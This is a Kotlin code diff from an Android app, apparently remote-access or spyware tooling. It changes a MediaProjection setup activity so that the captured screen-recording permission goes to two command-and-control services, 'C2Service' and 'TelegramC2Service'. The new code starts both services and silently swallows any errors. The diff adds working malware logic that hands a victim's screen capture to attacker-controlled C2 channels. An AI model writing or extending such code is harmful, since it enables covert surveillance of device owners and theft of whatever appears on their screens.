@@ -25,17 +25,22 @@ class MediaProjectionSetupActivity : Activity() {
                 .putInt("proj_code", resultCode)
                 .putString("proj_data", data.toUri(0))
                 .apply()
-            LogBus.append(applicationContext, "MP", "permission granted, starting C2Service")
 
-            val svc = Intent(this, C2Service::class.java).apply {
-                action = "START_PROJECTION"
-                putExtra("proj_result_code", resultCode)
-                putExtra("proj_data", data)
+            // Notify BOTH services; whichever is running picks it up
+            for (cls in listOf(C2Service::class.java, TelegramC2Service::class.java)) {
+                val svc = Intent(this, cls).apply {
+                    action = "START_PROJECTION"
+                    putExtra("proj_result_code", resultCode)
+                    putExtra("proj_data", data)
+                }
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                        startForegroundService(svc)
+                    else
+                        startService(svc)
+                } catch (_: Exception) {}
             }
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                startForegroundService(svc)
-            else
-                startService(svc)
+            LogBus.append(applicationContext, "MP", "both services notified")
         } else {
             LogBus.append(applicationContext, "MP", "denied/cancelled")
         }
